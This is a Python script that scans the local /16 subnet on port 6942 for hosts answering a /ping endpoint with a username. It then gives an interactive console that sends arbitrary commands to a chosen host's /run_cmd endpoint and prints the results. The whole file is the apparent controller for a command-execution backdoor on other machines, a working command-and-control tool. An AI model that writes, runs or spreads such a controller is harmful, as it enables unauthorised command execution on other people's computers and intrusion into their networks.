import requests
import concurrent.futures
import sys

def get_local_ip():
    import socket
    """Try to determine the local IP address of the machine."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        # Use Google Public DNS server to determine own IP
        sock.connect(('8.8.8.8', 80))

        return sock.getsockname()[0]
    except socket.error:
        try:
            return socket.gethostbyname(socket.gethostname())
        except socket.gaierror:
            return '127.0.0.1'
    finally:
        sock.close()


def get_urls():
    out = []
    my_ip = get_local_ip().split('.')
    for num1 in range(0, 128):
        for num2 in range(0, 128):
            out.append('http://'+my_ip[0]+'.'+my_ip[1] +
                       '.'+str(num1)+'.'+str(num2)+':6942/ping')
    return out


def load_url(url, timeout):
    return requests.get(url, timeout=timeout)


resp_ok = 0
resp_err = 0

urls = get_urls()
successful_urls = []
print()
sys.stdout.write('\r0 / '+str(len(urls)))
sys.stdout.flush()

with concurrent.futures.ThreadPoolExecutor(max_workers=1500) as executor:

    future_to_url = {executor.submit(
        load_url, url, 2): url for url in urls}
    for future in concurrent.futures.as_completed(future_to_url):
        url = future_to_url[future]
        try:
            data = future.result()
            successful_urls.append(
                {'url': url, 'user': data.json()['users'][0]})
            #print('success: ' + url)
        except Exception as exc:
            resp_err += 1
            #print('fail: ' + url)
        else:
            resp_ok += 1
        sys.stdout.write('\r'+str(resp_ok+resp_err)+' / '+str(len(urls)))
        sys.stdout.flush()
print()
if len(successful_urls) == 0:
    print('No devices were found to be connected to the local network.')
for url in successful_urls:
    print(url['user']+': '+url['url'])

selected_user = None
while True:
    if selected_user == None:
        username = 'None'
    else:
        username = str(successful_urls[selected_user]['user'])
    inp = input(username+' > ')
    if inp in ['exit', 'quit']:
        break
    elif inp.split(' ')[0] == 'select':
        if len(inp.split(' ')) == 1:
            print('please give username of computer to connect to')
            continue
        prev_selected = selected_user
        selected_user = None
        for i, url in enumerate(successful_urls):
            if url['user'] == inp.split(' ')[1]:
                selected_user = i
        if selected_user == None:
            print('User %s is not present on the local network, please select a different user.' %
                  inp.split(' ')[1])
            selected_user = prev_selected
            continue
    elif inp.split(' ')[0] == 'deselect':
        selected_user = None
    elif inp.split(' ')[0] == 'sendcmd':
        if selected_user == None:
            print('No user selected, please select a user with\n\tselect <username>')
            continue
        print('Please input payload cmd below:')
        cmd = input(' > ')
        print(cmd + ' has been sent off to ' + username)
        if cmd == 'chrome':
            payload = {
                'cmd': '/Program Files/Google/Chrome/Application/chrome.exe'}
        else:
            payload = {'cmd': cmd}
        resp = requests.request(
            method='POST', url='http://'+successful_urls[selected_user]['url'].split('/')[2]+'/run_cmd', json=payload)
        print('Response: "\n'+resp.json()['response']+'\n"')
    elif inp.split(' ')[0] == 'cmdflow':
        if selected_user == None:
            print('No user selected, please select a user with\n\tselect <username>')
            continue
        print('Please input payload cmd below (type exit to exit the flow):')
        while True:
            cmd = input(' > ')
            if cmd == 'exit':
                break
            print(cmd + ' has been sent off to ' + username)
            if cmd == 'chrome':
                payload = {
                    'cmd': '/Program Files/Google/Chrome/Application/chrome.exe'}
            else:
                payload = {'cmd': cmd}
            resp = requests.request(
                method='POST', url='http://'+successful_urls[selected_user]['url'].split('/')[2]+'/run_cmd', json=payload)
            print('Response: "'+resp.json()['response']+'"')
